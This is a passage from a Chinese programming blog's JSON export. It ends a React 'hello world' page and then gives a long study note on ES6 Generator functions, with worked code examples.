id=\"root\"&gt;&lt;/div&gt; &lt;script src=\"https://unpkg.com/react@16/umd/react.development.js\"&gt;&lt;/script&gt; &lt;script src=\"https://unpkg.com/react-dom@16/umd/react-dom.development.js\"&gt;&lt;/script&gt; &lt;script src=\"https://unpkg.com/babel-standalone@6.15.0/babel.min.js\"&gt;&lt;/script&gt; &lt;script type=\"text/babel\"&gt; ReactDOM.render( &lt;h1&gt;Hello, world!&lt;/h1&gt;, document.getElementById('root') ); &lt;/script&gt; &lt;!-- Note: this page is a great way to try React but it's not suitable for production. It slowly compiles JSX with Babel in the browser and uses a large development build of React. To set up a production-ready React build environment, follow these instructions: * https://reactjs.org/docs/add-react-to-a-new-app.html * https://reactjs.org/docs/add-react-to-an-existing-app.html You can also use React without JSX, in which case you can remove Babel: * https://reactjs.org/docs/react-without-jsx.html * https://reactjs.org/docs/cdn-links.html --&gt; &lt;/body&gt;&lt;/html&gt; 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"《ES6标准入门》之异步编程Generator","slug":"ES6-ryf-generator","date":"2018-04-03T04:00:29.000Z","updated":"2019-01-25T10:04:03.605Z","comments":true,"path":"2018/04/03/ES6-ryf-generator/","link":"","permalink":"http://liuxuewen-site.github.io/2018/04/03/ES6-ryf-generator/","excerpt":"","text":"一、Generator1、基本概念： Generator 函数是 ES6 提供的一种异步编程解决方案。 语法上，1）可以把它理解成 Generator 函数是一个状态机，封装了多个内部状态。2）执行 Generator 函数会返回一个遍历器对象，即 Generator 还是一个遍历器对象生成函数，返回的遍历器对象，可以依次遍历 Generator 函数内部的每一个状态。 形式上，Generator 函数是一个普通函数，但是有两个特征。1）function关键字与函数名之间有一个星号；2）函数体内部使用yield表达式，定义不同的内部状态（yield在英语里的意思就是“产出”）。 2、基本用法： 1234567function* helloWorldGenerator() &#123; yield 'hello'; yield 'world'; return 'ending';&#125;var hw = helloWorldGenerator(); 上面代码定义了一个 Generator 函数helloWorldGenerator，内部有两个yield表达式，即该函数有三个状态：hello，world 和 return 语句（结束执行）。 接着，Generator 函数的调用方法与普通函数一样，在函数名后面加上一对圆括号。不同的是，调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象，即遍历器对象（Iterator Object）。 下一步，必须调用遍历器对象的next方法，使得指针移向下一个状态。即每次调用next方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个yield表达式（或return语句）为止。换言之，Generator 函数是分段执行的，yield表达式是暂停执行的标记，而next方法可以恢复执行。 1234567891011hw.next()// &#123; value: 'hello', done: false &#125;hw.next()// &#123; value: 'world', done: false &#125;hw.next()// &#123; value: 'ending', done: true &#125;hw.next()// &#123; value: undefined, done: true &#125; 上面代码一共调用了四次next方法。 第一次调用，Generator 函数开始执行，直到遇到第一个yield表达式为止。next方法返回一个对象，它的value属性就是当前yield表达式的值hello，done属性的值false，表示遍历还没有结束。 第二次调用，Generator 函数从上次yield表达式停下的地方，一直执行到下一个yield表达式。next方法返回的对象的value属性就是当前yield表达式的值world，done属性的值false，表示遍历还没有结束。 第三次调用，Generator 函数从上次yield表达式停下的地方，一直执行到return语句（如果没有return语句，就执行到函数结束）。next方法返回的对象的value属性，就是紧跟在return语句后面的表达式的值（如果没有return语句，则value属性的值为undefined），done属性的值true，表示遍历已经结束。 第四次调用，此时 Generator 函数已经运行完毕，next方法返回对象的value属性为undefined，done属性为true。以后再调用next方法，返回的都是这个值。 总结，调用 Generator 函数，返回一个遍历器对象，代表 Generator 函数的内部指针。以后，每次调用遍历器对象的next方法，就会返回一个有着value和done两个属性的对象。value属性表示当前的内部状态的值，是yield表达式后面那个表达式的值；done属性是一个布尔值，表示是否遍历结束。 ES6 没有规定，function关键字与函数名之间的星号，写在哪个位置。这导致下面的写法都能通过。(由于 Generator 函数仍然是普通函数，所以一般的写法是第三种，即星号紧跟在function关键字后面) 1234function * foo(x, y) &#123; ··· &#125;function *foo(x, y) &#123; ··· &#125;function* foo(x, y) &#123; ··· &#125;function*foo(x, y) &#123; ··· &#125; 接着我们谈一下与 Iterator 接口的关系： 任意一个对象的Symbol.iterator方法，等于该对象的遍历器生成函数，调用该函数会返回该对象的一个遍历器对象。 由于 Generator 函数就是遍历器生成函数，因此可以把 Generator 赋值给对象的Symbol.iterator属性，从而使得该对象具有 Iterator 接口。 1234567891011var myIterable = &#123;&#125;;myIterable[Symbol.iterator] = function* () &#123; yield 1; yield 2; yield 3;&#125;;[...myIterable] // [1, 2, 3]上面代码中，Generator 函数赋值给Symbol.iterator属性，从而使得myIterable对象具有了 Iterator 接口，可以被...运算符遍历了。 Generator 函数执行后，返回一个遍历器对象。该对象本身也具有Symbol.iterator属性，执行后返回自身。 1234567891011function* gen()&#123; // some code&#125;var g = gen();g[Symbol.iterator]() === g// true上面代码中，gen是一个 Generator 函数，调用它会生成一个遍历器对象g。它的Symbol.iterator属性，也是一个遍历器对象生成函数，执行后返回它自己。 3、yield 表达式： 由于 Generator 函数返回的遍历器对象，只有调用next方法才会遍历下一个内部状态，所以其实提供了一种可以暂停执行的函数。yield表达式就是暂停标志。 遍历器对象的next方法的运行逻辑如下: （1）遇到yield表达式，就暂停执行后面的操作，并将紧跟在yield后面的那个表达式的值，作为返回的对象的value属性值。 （2）下一次调用next方法时，再继续往下执行，直到遇到下一个yield表达式。 （3）如果没有再遇到新的yield表达式，就一直运行到函数结束，直到return语句为止，并将return语句后面的表达式的值，作为返回的对象的value属性值。 （4）如果该函数没有return语句，则返回的对象的value属性值为undefined。 注意，yield表达式后面的表达式，只有当调用next方法、内部指针指向该语句时才会执行，因此等于为 JavaScript 提供了手动的“惰性求值”（Lazy Evaluation）的语法功能。 yield表达式与return语句。 相似在于都能返回紧跟在语句后面的那个表达式的值。 区别在于每次遇到yield，函数暂停执行，下一次再从该位置继续向后执行，而return语句不具备位置记忆的功能。一个函数里面，只能执行一次（或者说一个）return语句，但是可以执行多次（或者说多个）yield表达式。 正常函数只能返回一个值，因为只能执行一次return： Generator 函数可以返回一系列的值，因为可以有任意多个yield。 从另一个角度看，也可以说 Generator 生成了一系列的值（英语中generator是“生成器”的意思）。 Generator 函数可以不用yield表达式，这时就变成了一个单纯的暂缓执行函数: 123456789101112function* f() &#123; console.log('执行了！')&#125;var generator = f();setTimeout(function () &#123; generator.next()&#125;, 2000);上面代码中，函数f如果是普通函数，在为变量generator赋值时就会执行。但是函数f是一个 Generator 函数，只有调用next方法时，函数f才会执行。 另外需要注意，yield表达式只能用在 Generator 函数里面，用在其他地方都会报错: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546(function ()&#123; yield 1;&#125;)()// SyntaxError: Unexpected number上面代码在一个普通函数中使用yield表达式，结果产生一个句法错误。var arr = [1, [[2, 3], 4], [5, 6]];var flat = function* (a) &#123; a.forEach(function (item) &#123; if (typeof item !== 'number') &#123; yield* flat(item); &#125; else &#123; yield item; &#125; &#125;);&#125;;for (var f of flat(arr))&#123; console.log(f);&#125;上面代码也会产生句法错误，因为forEach方法的参数是一个普通函数，但是在里面使用了yield表达式（这个函数里面还使用了yield*表达式，详细介绍见后文）。var arr = [1, [[2, 3], 4], [5, 6]];var flat = function* (a) &#123; var length = a.length; for (var i = 0; i &lt; length; i++) &#123; var item = a[i]; if (typeof item !== 'number') &#123; yield* flat(item); &#125; else &#123; yield item; &#125; &#125;&#125;;for (var f of flat(arr)) &#123; console.log(f);&#125;// 1, 2, 3, 4, 5, 6上面代码是对上例的修改，方法是改用for循环即没错。 另外，yield表达式，如果用在一个表达式之中必须放圆括号里面；用作函数参数或放在赋值表达式的右边可以不加括号。 123456789101112function* demo() &#123; console.log('Hello' + yield); // SyntaxError console.log('Hello' + yield 123); // SyntaxError console.log('Hello' + (yield)); // OK console.log('Hello' + (yield 123)); // OK&#125;function* demo() &#123; foo(yield 'a', yield 'b'); // OK let input = yield; // OK&#125; 4、next 方法的参数 yield表达式本身没有返回值，或者说总是返回undefined。next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值。 12345678910111213141516function* f() &#123; for(var i = 0; true; i++) &#123; var reset = yield i; if(reset) &#123; i = -1; &#125; &#125;&#125;var g = f();g.next() // &#123; value: 0, done: false &#125;g.next() // &#123; value: 1, done: false &#125;g.next(true) // &#123; value: 0, done: false &#125;上面代码先定义了一个可以无限运行的 Generator 函数f，如果next方法没有参数，每次运行到yield表达式，变量reset的值总是undefined,i永远不会等于-1。当next方法带一个参数true时，变量reset就被重置为这个参数（即true），因此i会等于-1，下一轮循环就会从-1开始递增。 这个功能有重要的语法意义。Generator函数从暂停状态到恢复运行，它的上下文状态（context）是不变的。通过next方法的参数，就有办法在Generator函数开始运行之后，继续向函数体内部注入值。也就是说，可以在Generator函数运行的不同阶段，从外部向内部注入不同的值，从而调整函数行为。 看一个例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function* foo(x) &#123; var y = 2 * (yield (x + 1)); var z = yield (y / 3); return (x + y + z);&#125;var a = foo(5);a.next() // Object&#123;value:6, done:false&#125;a.next() // Object&#123;value:NaN, done:false&#125;a.next() // Object&#123;value:NaN, done:true&#125;var b = foo(5);b.next() // &#123; value:6, done:false &#125;b.next(12) // &#123; value:8, done:false &#125;b.next(13) // &#123; value:42, done:true &#125;上面代码中，第一次运行next方法时，yield表达式返回的value属性等于x+1=6。此处，yield表达式没有返回值，为undefined。第二次运行next方法的时候不带参数，所以y等于2*undefined（即NaN），除以3后还是NaN，因此返回对象的value属性也等于NaN。此处，yield表达式没有返回值，为undefined。第三次运行Next方法的时候不带参数，所以z等于undefined，返回对象的value属性等于5 + NaN + undefined，即NaN。如果向next方法提供参数，返回结果就不一样了。上面代码第一次调用b的next方法时，返回x+1的值6；第二次调用next方法，将上一次yield表达式的值设为12，因此y等于24，返回y / 3的值8；第三次调用next方法，将上一次yield表达式的值设为13，因此z等于13，x等于5，y等于24，return语句的值等于42。function* dataConsumer() &#123; console.log('Started'); console.log(`1. $&#123;yield&#125;`); console.log(`2. $&#123;yield&#125;`); return 'result';&#125;let genObj = dataConsumer();genObj.next();// StartedgenObj.next('a')// 1. agenObj.next('b')// 2. b上面代码是一个很直观的例子，每次通过next方法向 Generator 函数输入值，然后打印出来。 注意，由于next方法的参数表示上一个yield表达式的返回值，所以在第一次使用next方法时，传递参数是无效的。V8 引擎直接忽略第一次使用next方法时的参数，只有从第二次使用next方法开始，参数才是有效的。从语义上讲，第一个next方法用来启动遍历器对象，所以不用带有参数。 如果想要第一次调用next方法时，就能够输入值，可以在 Generator 函数外面再包一层： 1234567891011121314151617function wrapper(generatorFunction) &#123; return function (...args) &#123; let generatorObject = generatorFunction(...args); generatorObject.next(); return generatorObject; &#125;;&#125;const wrapped = wrapper(function* () &#123; console.log(`First input: $&#123;yield&#125;`); return 'DONE';&#125;);wrapped().next('hello!')// First input: hello!上面代码中，Generator 函数如果不用wrapper先包一层，是无法第一次调用next方法，就输入参数的。 5、for…of 循环自动遍历 for…of循环可以自动遍历 Generator 函数时生成的Iterator对象，且此时不再需要调用next方法。 1234567891011121314151617function* foo() &#123; yield 1; yield 2; yield 3; yield 4; yield 5; return 6;&#125;for (let v of foo()) &#123; console.log(v);&#125;// 1 2 3 4 5上面代码使用for...of循环，依次显示 5 个yield表达式的值。这里需要注意，一旦next方法的返回对象的done属性为true，for...of循环就会中止，且不包含该返回对象，所以上面代码的return语句返回的6，不包括在for...of循环之中。 看个例子：（利用Generator函数和for…of循环实现斐波那契数列） 123456789101112function* fibonacci() &#123; let [prev, curr] = [0, 1]; for (;;) &#123; [prev, curr] = [curr, prev + curr]; yield curr; &#125;&#125;for (let n of fibonacci()) &#123; if (n &gt; 1000) break; console.log(n);&#125; 利用for…of循环，可以写出遍历任意对象（object）的方法。原生的 JavaScript 对象没有遍历接口，无法使用for…of循环。通过 Generator 函数为它加上这个接口，就可以用了。 1234567891011121314151617181920212223242526272829303132333435363738function* objectEntries(obj) &#123; let propKeys = Reflect.ownKeys(obj); for (let propKey of propKeys) &#123; yield [propKey, obj[propKey]]; &#125;&#125;let jane = &#123; first: 'Jane', last: 'Doe' &#125;;for (let [key, value] of objectEntries(jane)) &#123; console.log(`$&#123;key&#125;: $&#123;value&#125;`);&#125;// first: Jane// last: Doe上面代码中，对象jane原生不具备 Iterator 接口，无法用for...of遍历。这时，我们通过 Generator 函数objectEntries为它加上遍历器接口，就可以用for...of遍历了。function* objectEntries() &#123; let propKeys = Object.keys(this); for (let propKey of propKeys) &#123; yield [propKey, this[propKey]]; &#125;&#125;let jane = &#123; first: 'Jane', last: 'Doe' &#125;;jane[Symbol.iterator] = objectEntries;for (let [key, value] of jane) &#123; console.log(`$&#123;key&#125;: $&#123;value&#125;`);&#125;// first: Jane// last: Doe加上遍历器接口的另一种写法是，将 Generator 函数加到对象的Symbol.iterator属性上面。 除了for…of循环以外，扩展运算符（…）、解构赋值和Array.from方法内部调用的，都是遍历器接口。这意味着，它们都可以将 Generator 函数返回的 Iterator 对象，作为参数。 123456789101112131415161718192021222324function* numbers () &#123; yield 1 yield 2 return 3 yield 4&#125;// 扩展运算符[...numbers()] // [1, 2]// Array.from 方法Array.from(numbers()) // [1, 2]// 解构赋值let [x, y] = numbers();x // 1y // 2// for...of 循环for (let n of numbers()) &#123; console.log(n)&#125;// 1// 2 6、Generator.prototype.throw Generator函数返回的遍历器对象，都有一个throw方法，可以在Generator函数体外抛出错误，然后在 Generator函数体内捕获。 123456789101112131415161718192021222324var g = function* () &#123; try &#123; yield; &#125; catch (e) &#123; console.log('内部捕获', e); &#125;&#125;;var i = g();i.next();try &#123; i.throw('a'); i.throw('b');&#125; catch (e) &#123; console.log('外部捕获', e);&#125;// 内部捕获 a// 外部捕获 b上面代码中，遍历器对象i连续抛出两个错误。第一个错误被 Generator 函数体内的catch语句捕获。i第二次抛出错误，由于 Generator 函数内部的catch语句已经执行过了，不会再捕捉到这个错误了，所以这个错误就被抛出了 Generator 函数体，被函数体外的catch语句捕获。 throw方法可以接受一个参数，该参数会被catch语句接收，建议抛出Error对象的实例: 123456789101112131415var g = function* () &#123; try &#123; yield; &#125; catch (e) &#123; console.log(e); &#125;&#125;;var i = g();i.next();i.throw(new Error('出错了！'));// Error: 出错了！(…)注意，不要混淆遍历器对象的throw方法和全局的throw命令。上面代码的错误是用遍历器对象的throw方法抛出的，不是用throw命令抛出的。后者只能被函数体外的catch语句捕获。 若函数体外的catch语句块捕获了抛出的错误，就不会再继续try代码块里面剩余的语句了： 1234567891011121314151617181920212223var g = function* () &#123; while (true) &#123; try &#123; yield; &#125; catch (e) &#123; if (e != 'a') throw e; console.log('内部捕获', e); &#125; &#125;&#125;;var i = g();i.next();try &#123; throw new Error('a'); throw new Error('b');&#125; catch (e) &#123; console.log('外部捕获', e);&#125;// 外部捕获 [Error: a]上面代码之所以只捕获了a，是因为函数体外的catch语句块，捕获了抛出的a错误以后，就不会再继续try代码块里面剩余的语句了。 如果 Generator 函数内部没有部署try…catch代码块，那么throw方法抛出的错误，将被外部try…catch代码块捕获: 12345678910111213141516171819var g = function* () &#123; while (true) &#123; yield; console.log('内部捕获', e); &#125;&#125;;var i = g();i.next();try &#123; i.throw('a'); i.throw('b');&#125; catch (e) &#123; console.log('外部捕获', e);&#125;// 外部捕获 a上面代码中，Generator 函数g内部没有部署try...catch代码块，所以抛出的错误直接被外部catch代码块捕获。 如果 Generator 函数内部和外部，都没有部署try…catch代码块，那么程序将报错，直接中断执行: 123456789101112var gen = function* gen()&#123; yield console.log('hello'); yield console.log('world');&#125;var g = gen();g.next();g.throw();// hello// Uncaught undefined上面代码中，g.throw抛出错误以后，没有任何try...catch代码块可以捕获这个错误，导致程序报错，中断执行。 throw方法被捕获以后，会附带执行下一条yield表达式。也就是说，会附带执行一次next方法: 1234567891011121314151617var gen = function* gen()&#123; try &#123; yield console.log('a'); &#125; catch (e) &#123; // ... &#125; yield console.log('b'); yield console.log('c');&#125;var g = gen();g.next() // ag.throw() // bg.next() // c上面代码中，g.throw方法被捕获以后，自动执行了一次next方法，所以会打印b。另外，也可以看到，只要Generator函数内部部署了try...catch代码块，那么遍历器的throw方法抛出的错误不影响下一次遍历。 另外，throw命令与g.throw方法是无关的，两者互不影响: 1234567891011121314151617var gen = function* gen()&#123; yield console.log('hello'); yield console.log('world');&#125;var g = gen();g.next();try &#123; throw new Error();&#125; catch (e) &#123; g.next();&#125;// hello// world上面代码中，throw命令抛出的错误不会影响到遍历器的状态，所以两次执行next方法，都进行了正确的操作。 这种函数体内捕获错误的机制，大大方便了对错误的处理。多个yield表达式，可以只用一个try…catch代码块来捕获错误。如果使用回调函数的写法，想要捕获多个错误，就不得不为每个函数内部写一个错误处理语句，现在只在 Generator 函数内部写一次catch语句就可以了。 Generator 函数体外抛出的错误，可以在函数体内捕获；反过来，Generator 函数体内抛出的错误，也可以被函数体外的catch捕获: 123456789101112131415161718function* foo() &#123; var x = yield 3; var y = x.toUpperCase(); yield y;&#125;var it = foo();it.next(); // &#123; value:3, done:false &#125;try &#123; it.next(42);&#125; catch (err) &#123; console.log(err);&#125;上面代码中，第二个next方法向函数体内传入一个参数 42，数值是没有toUpperCase方法的，所以会抛出一个 TypeError 错误，被函数体外的catch捕获。 一旦 Generator 执行过程中抛出错误，且没有被内部捕获，就不会再执行下去了。如果此后还调用next方法，将返回一个value属性等于undefined、done属性等于true的对象，即 JavaScript 引擎认为这个 Generator 已经运行结束了: 123456789101112131415161718192021222324252627282930313233343536373839404142function* g() &#123; yield 1; console.log('throwing an exception'); throw new Error('generator broke!'); yield 2; yield 3;&#125;function log(generator) &#123; var v; console.log('starting generator'); try &#123; v = generator.next(); console.log('第一次运行next方法', v); &#125; catch (err) &#123; console.log('捕捉错误', v); &#125; try &#123; v = generator.next(); console.log('第二次运行next方法', v); &#125; catch (err) &#123; console.log('捕捉错误', v); &#125; try &#123; v = generator.next(); console.log('第三次运行next方法', v); &#125; catch (err) &#123; console.log('捕捉错误', v); &#125; console.log('caller done');&#125;log(g());// starting generator// 第一次运行next方法 &#123; value: 1, done: false &#125;// throwing an exception// 捕捉错误 &#123; value: 1, done: false &#125;// 第三次运行next方法 &#123; value: undefined, done: true &#125;// caller done上面代码一共三次运行next方法，第二次运行的时候会抛出错误，然后第三次运行的时候，Generator 函数就已经结束了，不再执行下去了。 7、Generator.prototype.return Generator 函数返回的遍历器对象，还有一个return方法，可以返回给定的值，并且终结遍历 Generator 函数。 1234567891011121314function* gen() &#123; yield 1; yield 2; yield 3;&#125;var g = gen();g.next() // &#123; value: 1, done: false &#125;g.return('foo') // &#123; value: \"foo\", done: true &#125;g.next() // &#123; value: undefined, done: true &#125;上面代码中，遍历器对象g调用return方法后，返回值的value属性就是return方法的参数foo。并且，Generator函数的遍历就终止了，返回值的done属性为true，再调用next方法，done属性总是返回true。 如果return方法调用时，不提供参数，则返回值的value属性为undefined: 12345678910function* gen() &#123; yield 1; yield 2; yield 3;&#125;var g = gen();g.next() // &#123; value: 1, done: false &#125;g.return() // &#123; value: undefined, done: true &#125; 如果 Generator 函数内部有try…finally代码块，那么return方法会推迟到finally代码块执行完再执行。 12345678910111213141516171819unction* numbers () &#123; yield 1; try &#123; yield 2; yield 3; &#125; finally &#123; yield 4; yield 5; &#125; yield 6;&#125;var g = numbers();g.next() // &#123; value: 1, done: false &#125;g.next() // &#123; value: 2, done: false &#125;g.return(7) // &#123; value: 4, done: false &#125;g.next() // &#123; value: 5, done: false &#125;g.next() // &#123; value: 7, done: true &#125;上面代码中，调用return方法后，就开始执行finally代码块，然后等到finally代码块执行完，再执行return方法。 8、next()、throw()、return() 有人说，next()、throw()、return()这三个方法本质上是同一件事。它们的作用都是让 Generator 函数恢复执行，并且使用不同的语句替换yield表达式。 1234567const g = function* (x, y) &#123; let result = yield x + y; return result;&#125;;const gen = g(1, 2);gen.next(); // Object &#123;value: 3, done: false&#125; next()是将yield表达式替换成一个值： 123gen.next(1); // Object &#123;value: 1, done: true&#125;相当于将 let result = yield x + y,替换成 let result = 1；如果next方法没有参数，就相当于替换成undefined。 throw()是将yield表达式替换成一个throw语句： 123gen.throw(new Error('出错了')); // Uncaught Error: 出错了相当于将 let result = yield x + y替换成 let result = throw(new Error('出错了')); return()是将yield表达式替换成一个return语句： 123gen.return(2); // Object &#123;value: 2, done: true&#125;相当于将 let result = yield x + y替换成 let result = return 2; 9、yield* 表达式 如果在 Generator 函数内部，调用另一个 Generator 函数，默认情况下是没有效果的： 123456789101112131415161718function* foo() &#123; yield 'a'; yield 'b';&#125;function* bar() &#123; yield 'x'; foo(); yield 'y';&#125;for (let v of bar())&#123; console.log(v);&#125;// \"x\"// \"y\"上面代码中，foo和bar都是 Generator 函数，在bar里面调用foo，是不会有效果的。 这个就需要用到yield*表达式，用来在一个 Generator 函数里面执行另一个 Generator 函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667function* foo() &#123; yield 'a'; yield 'b';&#125;function* bar() &#123; yield 'x'; yield* foo(); yield 'y';&#125;// 等同于function* bar() &#123; yield 'x'; yield 'a'; yield 'b'; yield 'y';&#125;// 等同于function* bar() &#123; yield 'x'; for (let v of foo()) &#123; yield v; &#125; yield 'y';&#125;for (let v of bar())&#123; console.log(v);&#125;// \"x\"// \"a\"// \"b\"// \"y\"看个例子：function* inner() &#123; yield 'hello!';&#125;function* outer1() &#123; yield 'open'; yield inner(); yield 'close';&#125;var gen = outer1()gen.next().value // \"open\"gen.next().value // 返回一个遍历器对象gen.next().value // \"close\"function* outer2() &#123; yield 'open' yield* inner() yield 'close'&#125;var gen = outer2()gen.next().value // \"open\"gen.next().value // \"hello!\"gen.next().value // \"close\"上面例子中，outer2使用了yield*，outer1没使用。结果就是，outer1返回一个遍历器对象，outer2返回该遍历器对象的内部值。 从语法角度看，如果yield表达式后面跟的是一个遍历器对象，需要在yield表达式后面加上星号，表明它返回的是一个遍历器对象。这被称为yield*表达式。 12345678910111213141516171819202122let delegatedIterator = (function* () &#123; yield 'Hello!'; yield 'Bye!';&#125;());let delegatingIterator = (function* () &#123; yield 'Greetings!'; yield* delegatedIterator; yield 'Ok, bye.';&#125;());for(let value of delegatingIterator) &#123; console.log(value);&#125;// \"Greetings!\"// \"Hello!\"// \"Bye!\"// \"Ok, bye.\"上面代码中，delegatingIterator是代理者，delegatedIterator是被代理者。由于yield* delegatedIterator语句得到的值，是一个遍历器，所以要用星号表示。运行结果就是使用一个遍历器，遍历了多个 Generator 函数，有递归的效果。 如果yield*后面跟着一个数组，由于数组原生支持遍历器，因此就会遍历数组成员： 1234567function* gen()&#123; yield* [\"a\", \"b\", \"c\"];&#125;gen().next() // &#123; value:\"a\", done:false &#125;上面代码中，yield命令后面如果不加星号，返回的是整个数组，加了星号就表示返回的是数组的遍历器对象。 实际上，任何数据结构只要有 Iterator 接口，就可以被yield*遍历： 123456789let read = (function* () &#123; yield 'hello'; yield* 'hello';&#125;)();read.next().value // \"hello\"read.next().value // \"h\"上面代码中，yield表达式返回整个字符串，yield*语句返回单个字符。因为字符串具有 Iterator 接口，所以被yield*遍历。 yield*后面的 Generator 函数（没有return语句时），等同于在 Generator 函数内部，部署一个for…of循环： 123456789101112131415161718function* concat(iter1, iter2) &#123; yield* iter1; yield* iter2;&#125;// 等同于function* concat(iter1, iter2) &#123; for (var value of iter1) &#123; yield value; &#125; for (var value of iter2) &#123; yield value; &#125;&#125;上面代码说明，yield*后面的 Generator 函数（没有return语句时），不过是for...of的一种简写形式，完全可以用后者替代前者。反之，在有return语句时，则需要用var value = yield* iterator的形式获取return语句的值。 如果被代理的 Generator 函数有return语句，那么就可以向代理它的 Generator 函数返回数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function* foo() &#123; yield 2; yield 3; return \"foo\";&#125;function* bar() &#123; yield 1; var v = yield* foo(); console.log(\"v: \" + v); yield 4;&#125;var it = bar();it.next()// &#123;value: 1, done: false&#125;it.next()// &#123;value: 2, done: false&#125;it.next()// &#123;value: 3, done: false&#125;it.next();// \"v: foo\"// &#123;value: 4, done: false&#125;it.next()// &#123;value: undefined, done: true&#125;上面代码在第四次调用next方法的时候，屏幕上会有输出，这是因为函数foo的return语句，向函数bar提供了返回值。function* genFuncWithReturn() &#123; yield 'a'; yield 'b'; return 'The result';&#125;function* logReturned(genObj) &#123; let result = yield* genObj; console.log(result);&#125;[...logReturned(genFuncWithReturn())]// The result// 值为 [ 'a', 'b' ]上面代码中，存在两次遍历。第一次是扩展运算符遍历函数logReturned返回的遍历器对象，第二次是yield*语句遍历函数genFuncWithReturn返回的遍历器对象。这两次遍历的效果是叠加的，最终表现为扩展运算符遍历函数genFuncWithReturn返回的遍历器对象。所以，最后的数据表达式得到的值等于[ 'a', 'b' ]。但是，函数genFuncWithReturn的return语句的返回值The result，会返回给函数logReturned内部的result变量，因此会有终端输出。 yield*命令可以很方便地取出嵌套数组的所有成员： 1234567891011121314151617181920function* iterTree(tree) &#123; if (Array.isArray(tree)) &#123; for(let i=0; i &lt; tree.length; i++) &#123; yield* iterTree(tree[i]); &#125; &#125; else &#123; yield tree; &#125;&#125;const tree = [ 'a', ['b', 'c'], ['d', 'e'] ];for(let x of iterTree(tree)) &#123; console.log(x);&#125;// a// b// c// d// e 一个稍微复杂的例子，使用yield*语句遍历完全二叉树： 123456789101112131415161718192021222324252627282930313233// 下面是二叉树的构造函数，三个参数分别是左树、当前节点和右树function Tree(left, label, right) &#123; this.left = left; this.label = label; this.right = right;&#125;// 下面是中序（inorder）遍历函数。// 由于返回的是一个遍历器，所以要用generator函数。// 函数体内采用递归算法，所以左树和右树要用yield*遍历function* inorder(t) &#123; if (t) &#123; yield* inorder(t.left); yield t.label; yield* inorder(t.right); &#125;&#125;// 下面生成二叉树function make(array) &#123; if (array.length == 1) return new Tree(null, array[0], null); // 判断是否为叶节点 return new Tree(make(array[0]), array[1], make(array[2]));&#125;let tree = make([[['a'], 'b', ['c']], 'd', [['e'], 'f', ['g']]]);// 遍历二叉树var result = [];for (let node of inorder(tree)) &#123; result.push(node);&#125;result// ['a', 'b', 'c', 'd', 'e', 'f', 'g'] 10、作为对象属性的Generator 如果一个对象的属性是 Generator 函数，可以简写成下面的形式： 12345678910111213let obj = &#123; * myGeneratorMethod() &#123; ··· &#125;&#125;;上面代码中，myGeneratorMethod属性前面有一个星号，表示这个属性是一个 Generator 函数。等同于：let obj = &#123; myGeneratorMethod: function* () &#123; // ··· &#125;&#125;; 11、Generator 函数的this Generator 函数返回一个遍历器，ES6 规定这个遍历器是 Generator 函数的实例，继承了 Generator 函数的prototype对象上的方法。 123456789101112function* g() &#123;&#125;g.prototype.hello = function () &#123; return 'hi!';&#125;;let obj = g();obj instanceof g // trueobj.hello() // 'hi!'上面代码表明，Generator 函数g返回的遍历器obj，是g的实例，而且继承了g.prototype。 如果把g当作普通的构造函数，上例并不会生效，因为g返回的总是遍历器对象，而不是this对象，也即获取不到this。 12345678910function* g() &#123; this.a = 11;&#125;let obj = g();obj.next();obj.a // undefined上面代码中，Generator 函数g在this对象上面添加了一个属性a，但是obj对象拿不到这个属性。 Generator 函数也不能跟new命令一起用，会报错： 123456789function* F() &#123; yield this.x = 2; yield this.y = 3;&#125;new F()// TypeError: F is not a constructor上面代码中，new命令跟构造函数F一起使用，结果报错，因为F不是构造函数。 那么，有没有办法让 Generator 函数返回一个正常的对象实例，既可以用next方法，又可以获得正常的this？ 变通方法一： 首先，生成一个空对象，使用call方法绑定 Generator 函数内部的this。这样，构造函数调用以后，这个空对象就是 Generator 函数的实例对象了。 1234567891011121314151617181920function* F() &#123; this.a = 1; yield this.b = 2; yield this.c = 3;&#125;var obj = &#123;&#125;;var f = F.call(obj);f.next(); // Object &#123;value: 2, done: false&#125;f.next(); // Object &#123;value: 3, done: false&#125;f.next(); // Object &#123;value: undefined, done: true&#125;obj.a // 1obj.b // 2obj.c // 3上面代码中，首先是F内部的this对象绑定obj对象，然后调用它，返回一个 Iterator 对象。这个对象执行三次next方法（因为F内部有两个yield表达式），完成 F 内部所有代码的运行。这时，所有内部属性都绑定在obj对象上了，因此obj对象也就成了F的实例。 上面代码中，执行的是遍历器对象f，但是生成的对象实例是obj，有没有办法将这两个对象统一呢？ 变通方法二： 将obj换成F.prototype。 1234567891011121314function* F() &#123; this.a = 1; yield this.b = 2; yield this.c = 3;&#125;var f = F.call(F.prototype);f.next(); // Object &#123;value: 2, done: false&#125;f.next(); // Object &#123;value: 3, done: false&#125;f.next(); // Object &#123;value: undefined, done: true&#125;f.a // 1f.b // 2f.c // 3 再将F改成构造函数，就可以对它执行new命令了。 12345678910111213141516171819function* gen() &#123; this.a = 1; yield this.b = 2; yield this.c = 3;&#125;function F() &#123; return gen.call(gen.prototype);&#125;var f = new F();f.next(); // Object &#123;value: 2, done: false&#125;f.next(); // Object &#123;value: 3, done: false&#125;f.next(); // Object &#123;value: undefined, done: true&#125;f.a // 1f.b // 2f.c // 3 11、关系 Generator 与状态机： Generator 是实现状态机的最佳结构。 12345678910111213141516171819202122232425普通实现：var ticking = true;var clock = function() &#123; if (ticking) console.log('Tick!'); else console.log('Tock!'); ticking = !ticking;&#125;上面代码的clock函数是一个状态机，共有两种状态（Tick和Tock），每运行一次，就改变一次状态。Generator实现：var clock = function* () &#123; while (true) &#123; console.log('Tick!'); yield; console.log('Tock!'); yield; &#125;&#125;;上面的 Generator 实现与 ES5 实现对比，少了用来保存状态的外部变量ticking，更简洁，更安全（状态不会被非法篡改）、更符合函数式编程的思想，在写法上也更优雅。Generator 